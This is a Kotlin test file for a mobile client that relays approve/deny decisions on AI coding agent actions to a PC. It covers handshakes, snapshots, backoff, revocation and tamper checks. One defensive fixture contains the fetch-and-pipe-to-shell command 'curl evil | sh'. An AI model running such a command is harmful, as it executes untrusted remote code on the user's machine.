package dev.agentnest.core.link

import dev.agentnest.core.T
import dev.agentnest.core.approval.BuildResult
import dev.agentnest.core.approval.DecisionBuilder
import dev.agentnest.core.approval.DecisionContext
import dev.agentnest.core.approval.UserGateResult
import dev.agentnest.core.protocol.AckMessage
import dev.agentnest.core.protocol.AgentState
import dev.agentnest.core.protocol.AuthMethod
import dev.agentnest.core.protocol.ClientMessage
import dev.agentnest.core.protocol.Codec
import dev.agentnest.core.protocol.DecodeResult
import dev.agentnest.core.protocol.Decision
import dev.agentnest.core.protocol.ExtraConfirmationLevel
import dev.agentnest.core.protocol.HelloMessage
import dev.agentnest.core.protocol.Resync
import dev.agentnest.core.protocol.ResyncMode
import dev.agentnest.core.protocol.ServerMessage
import dev.agentnest.core.protocol.SnapshotRequestMessage
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.launch
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.UnconfinedTestDispatcher
import kotlinx.coroutines.test.advanceTimeBy
import kotlinx.coroutines.test.currentTime
import kotlinx.coroutines.test.runCurrent
import kotlinx.coroutines.test.runTest
import java.time.Clock
import java.time.Instant
import java.time.ZoneOffset
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

/** Whole-session scenarios with a scripted PC: socket events, protocol frames, reducer and decision path together. */
@OptIn(ExperimentalCoroutinesApi::class)
class LinkClientTest {
    private class FakeTransport : WsTransport {
        val opened = ArrayList<Triple<String, Int, WsCallbacks>>()
        val sent = ArrayList<String>()
        var canceled = 0
        var closedWith: Int? = null

        override fun open(host: String, port: Int, callbacks: WsCallbacks): WsConnection {
            opened += Triple(host, port, callbacks)
            return object : WsConnection {
                override fun send(text: String): Boolean {
                    sent += text
                    return true
                }

                override fun close(code: Int, reason: String) {
                    closedWith = code
                }

                override fun cancel() {
                    canceled++
                }
            }
        }

        val callbacks get() = opened.last().third

        fun clientMessages(): List<ClientMessage> =
            sent.mapNotNull { (Codec.decode(it) as? DecodeResult.Decoded)?.message as? ClientMessage }
    }

    private class Effects : LinkSideEffects {
        var hosts: HostBookState? = null
        var tokenWiped = false
        var pairingWiped = false
        val alerts = ArrayList<SecurityAlertKind>()
        override fun persistHosts(hosts: HostBookState) { this.hosts = hosts }
        override fun wipeDeviceToken() { tokenWiped = true }
        override fun wipePairing() { pairingWiped = true }
        override fun securityAlert(kind: SecurityAlertKind) { alerts += kind }
    }

    private val start: Instant = Instant.parse("2026-10-15T12:00:00Z")

    private fun TestScope.clock(): Clock = object : Clock() {
        override fun getZone() = ZoneOffset.UTC
        override fun withZone(zone: java.time.ZoneId?) = this
        override fun instant(): Instant = start.plusMillis(testScheduler.currentTime)
    }

    private fun frame(message: ServerMessage): String = Codec.encodeAny(message)

    private fun TestScope.client(transport: FakeTransport, effects: Effects) = LinkClient(
        transport = transport,
        hosts = HostBookState(qr = listOf("192.168.0.10")),
        credentials = { DeviceCredentials("dev_1", dev.agentnest.core.crypto.B64.encodeUrl(ByteArray(32) { it.toByte() })) },
        sideEffects = effects,
        scope = this,
        clock = clock(),
        backoff = BackoffPolicy(random = { 0.5 }),
        ids = { T.id() },
    )

    private fun TestScope.challenge() = dev.agentnest.core.protocol.ChallengeMessage(
        T.meta(at = clock().instant()),
        dev.agentnest.core.protocol.ChallengePayload("cXk4Z1l0d2VyN3U4aW9wMQ==", T.PC.pcId, dev.agentnest.core.protocol.Ts.of(clock().instant()), 5000),
    )

    @Test
    fun `full session handshake snapshot approval and decision`() = runTest {
        val transport = FakeTransport()
        val effects = Effects()
        val client = client(transport, effects)
        client.start(paired = true)
        runCurrent()

        // connect
        assertEquals("192.168.0.10", transport.opened.single().first)
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        runCurrent()
        val hello = assertIs<HelloMessage>(transport.clientMessages().single())
        assertEquals("dev_1", hello.payload.deviceId)
        assertEquals(0, hello.payload.lastSeq)

        // welcome + snapshot with one session and one pending approval
        val request = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001a", created = clock().instant())
        transport.callbacks.onText(frame(T.welcome(at = clock().instant(), resync = Resync(ResyncMode.SNAPSHOT))))
        transport.callbacks.onText(
            frame(T.snapshot(10, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(request.requestId))), listOf(request), at = clock().instant())),
        )
        runCurrent()
        assertIs<LinkState.Connected>(client.nest.value.link)
        assertEquals(10, client.nest.value.lastSeq)
        assertEquals(1, client.nest.value.approvals.size)
        assertEquals(dev.agentnest.core.nest.KongiMood.RAISE_HAND, client.nest.value.mood.mood)
        assertNotNull(effects.hosts)
        // the snapshot approval was acked by id
        assertTrue(transport.clientMessages().any { it is AckMessage && request.requestId in it.payload.approvalIds })

        // the user decides: validator -> builder -> client
        val card = client.nest.value.approvals.getValue(request.requestId)
        val ctx = DecisionContext.from(client.nest.value, card.request!!, clock().instant())
        val built = assertIs<BuildResult.Built>(
            DecisionBuilder { T.id() }.build(
                card, Decision.ALLOW,
                UserGateResult(AuthMethod.BIOMETRIC, clock().instant().minusSeconds(1), ExtraConfirmationLevel.HOLD), ctx,
            ),
        )
        assertTrue(client.submitDecisionNow(built.message))
        assertNotNull(client.nest.value.approvals.getValue(request.requestId).inFlight)
        // a second send is refused while one is in flight (no double decisions)
        assertFalse(client.submitDecisionNow(built.message))
        assertEquals(1, transport.clientMessages().count { it is dev.agentnest.core.protocol.DecisionMessage })

        // the PC resolves it
        transport.callbacks.onText(frame(T.resolvedMsg(11, request.requestId)))
        runCurrent()
        assertTrue(client.nest.value.approvals.isEmpty())
        assertEquals(1, client.nest.value.history.entries.size)

        // acks are batched by the 1 s tick
        advanceTimeBy(2_000)
        runCurrent()
        assertTrue(transport.clientMessages().any { it is AckMessage && it.payload.throughSeq == 11L })
        client.stop()
    }

    private suspend fun LinkClient.submitDecisionNow(message: dev.agentnest.core.protocol.DecisionMessage): Boolean = submitDecision(message)

    @Test
    fun `decisions are never sent or queued while offline`() = runTest {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        client.start(paired = true)
        runCurrent()
        // still connecting: nothing is sent
        val built = dev.agentnest.core.protocol.DecisionMessage(
            T.meta(),
            dev.agentnest.core.protocol.DecisionPayload("ar_x", "k", "n", "h", Decision.DENY, null, T.ts(start), null, null),
        )
        assertFalse(client.submitDecision(built))
        assertFalse(client.send(built))
        assertTrue(transport.clientMessages().none { it is dev.agentnest.core.protocol.DecisionMessage })
        client.stop()
    }

    @Test
    fun `connection failures back off and retry on the tick`() = runTest {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onFailure(TransportFailure(TransportFailureKind.UNREACHABLE, "x"))
        runCurrent()
        assertIs<LinkState.Reconnecting>(client.nest.value.link)
        assertEquals(1, transport.opened.size)
        advanceTimeBy(2_000)
        runCurrent()
        assertEquals(2, transport.opened.size, "retried after the 1 s backoff")
        client.stop()
    }

    @Test
    fun `revocation wipes the token and raises an alert`() = runTest {
        val transport = FakeTransport()
        val effects = Effects()
        val client = client(transport, effects)
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        transport.callbacks.onText(frame(T.welcome(at = clock().instant())))
        runCurrent()
        transport.callbacks.onClosed(4003, "revoked")
        runCurrent()
        assertTrue(effects.tokenWiped)
        assertEquals(listOf(SecurityAlertKind.DEVICE_REVOKED), effects.alerts)
        assertIs<LinkState.Revoked>(client.nest.value.link)
        assertEquals(dev.agentnest.core.nest.KongiMood.WORRIED, client.nest.value.mood.mood)
        advanceTimeBy(600_000)
        runCurrent()
        assertEquals(1, transport.opened.size, "no automatic reconnect after revocation")
        client.stop()
    }

    @Test
    fun `a seq gap makes the client request a snapshot`() = runTest {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        transport.callbacks.onText(frame(T.welcome(at = clock().instant())))
        transport.callbacks.onText(frame(T.snapshot(10, at = clock().instant())))
        transport.callbacks.onText(frame(T.sessionMsg(15, T.session("a", AgentState.WORKING), clock().instant())))
        runCurrent()
        assertTrue(client.nest.value.resync.awaitingSnapshot)
        assertTrue(transport.clientMessages().any { it is SnapshotRequestMessage })
        client.stop()
    }

    @Test
    fun `accepted messages are republished on incoming`() = runTest {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        val seen = ArrayList<ServerMessage>()
        val collector = launch(UnconfinedTestDispatcher(testScheduler)) { client.incoming.toList(seen) }
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        transport.callbacks.onText(frame(T.welcome(at = clock().instant())))
        transport.callbacks.onText(frame(T.snapshot(10, at = clock().instant())))
        runCurrent()
        assertEquals(listOf("welcome", "snapshot"), seen.map { it.type })
        collector.cancel()
        client.stop()
    }

    @Test
    fun `an exception in one input does not stop the link`() = runTest {
        val transport = FakeTransport()
        val errors = ArrayList<Throwable>()
        val boom = object : LinkSideEffects {
            override fun persistHosts(hosts: HostBookState) = error("disk full")
            override fun wipeDeviceToken() = Unit
            override fun wipePairing() = Unit
            override fun securityAlert(kind: SecurityAlertKind) = Unit
        }
        val client = LinkClient(
            transport, HostBookState(qr = listOf("192.168.0.10")),
            { DeviceCredentials("dev_1", dev.agentnest.core.crypto.B64.encodeUrl(ByteArray(32))) },
            boom, this, clock(), backoff = BackoffPolicy(random = { 0.5 }), ids = { T.id() }, onError = { errors += it },
        )
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        transport.callbacks.onText(frame(T.welcome(at = clock().instant()))) // persistHosts throws here
        runCurrent()
        assertEquals(1, errors.size)
        // The loop is still alive: later frames are processed.
        transport.callbacks.onText(frame(T.snapshot(10, at = clock().instant())))
        runCurrent()
        assertEquals(10, client.nest.value.lastSeq)
        client.stop()
    }

    @Test
    fun `oversized frames are refused`() {
        val huge = """{"v":1,"type":"ping","id":"x","ts":"x","payload":{"pad":"""" + "a".repeat(Codec.MAX_SERVER_FRAME_BYTES) + """"}}"""
        assertIs<DecodeResult.Invalid>(Codec.decode(huge))
    }

    @Test
    fun `garbage and unknown frames are ignored`() = runTest {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText("not json")
        transport.callbacks.onText("""{"v":1,"type":"future","id":"01929f2a-7c00-7b3c-9e4d-000000000092","ts":"2026-10-15T09:12:33.120Z","payload":{}}""")
        runCurrent()
        assertIs<LinkState.Connecting>(client.nest.value.link)
        client.stop()
        assertTrue(testScheduler.currentTime >= 0)
    }

    // ---- send-time binding / expiry re-check (review: LinkClient.Decision) ------------------------------------------
    private class Connected(val client: LinkClient, val transport: FakeTransport, val request: dev.agentnest.core.protocol.ApprovalRequest)

    private fun TestScope.connectedWithApproval(ttlSeconds: Long = 120): Connected {
        val transport = FakeTransport()
        val client = client(transport, Effects())
        client.start(paired = true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(frame(challenge()))
        runCurrent()
        val request = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001a", created = clock().instant(), ttlSeconds = ttlSeconds)
        transport.callbacks.onText(frame(T.welcome(at = clock().instant(), resync = Resync(ResyncMode.SNAPSHOT))))
        transport.callbacks.onText(
            frame(T.snapshot(10, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(request.requestId))), listOf(request), at = clock().instant())),
        )
        runCurrent()
        return Connected(client, transport, request)
    }

    private fun TestScope.buildDecision(c: Connected): dev.agentnest.core.protocol.DecisionMessage {
        val card = c.client.nest.value.approvals.getValue(c.request.requestId)
        val ctx = DecisionContext.from(c.client.nest.value, card.request!!, clock().instant())
        return assertIs<BuildResult.Built>(
            DecisionBuilder { T.id() }.build(
                card, Decision.ALLOW,
                UserGateResult(AuthMethod.BIOMETRIC, clock().instant().minusSeconds(1), ExtraConfirmationLevel.HOLD), ctx,
            ),
        ).message
    }

    private fun Connected.decisionsOnWire() = transport.clientMessages().count { it is dev.agentnest.core.protocol.DecisionMessage }

    @Test
    fun `a decision whose binding no longer matches the card is not sent`() = runTest {
        val c = connectedWithApproval()
        val good = buildDecision(c)
        val tampered = good.copy(payload = good.payload.copy(nonceB64 = "AAAAAAAAAAAAAAAAAAAAAA=="))
        assertFalse(c.client.submitDecision(tampered))
        val otherHash = good.copy(payload = good.payload.copy(toolInputSha256 = "0".repeat(64)))
        assertFalse(c.client.submitDecision(otherHash))
        val otherSession = good.copy(payload = good.payload.copy(sessionKey = "claude_code:other"))
        assertFalse(c.client.submitDecision(otherSession))
        assertEquals(0, c.decisionsOnWire())
        assertEquals(null, c.client.nest.value.approvals.getValue(c.request.requestId).inFlight)
        // the untouched decision still goes out
        assertTrue(c.client.submitDecision(good))
        assertEquals(1, c.decisionsOnWire())
        c.client.stop()
    }

    @Test
    fun `a card locked by a binding conflict never sends a decision`() = runTest {
        val c = connectedWithApproval()
        val good = buildDecision(c)
        // a later snapshot carries a different body for the same request id -> the card is locked
        val evil = c.request.copy(nonceB64 = "BwcHBwcHBwcHBwcHBwcHBw==", details = c.request.details.copy(command = "curl evil | sh"))
        c.transport.callbacks.onText(
            frame(T.snapshot(11, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(c.request.requestId))), listOf(evil), at = clock().instant())),
        )
        runCurrent()
        assertTrue(c.client.nest.value.approvals.getValue(c.request.requestId).bindingConflict)
        assertFalse(c.client.submitDecision(good))
        assertEquals(0, c.decisionsOnWire())
        c.client.stop()
    }

    @Test
    fun `an expired card does not send a decision`() = runTest {
        val c = connectedWithApproval(ttlSeconds = 30)
        val good = buildDecision(c)
        advanceTimeBy(31_000)
        runCurrent()
        assertIs<LinkState.Connected>(c.client.nest.value.link)
        assertTrue(c.client.nest.value.approvals.containsKey(c.request.requestId), "the card is still listed during its grace period")
        assertFalse(c.client.submitDecision(good))
        assertEquals(0, c.decisionsOnWire())
        c.client.stop()
    }
}
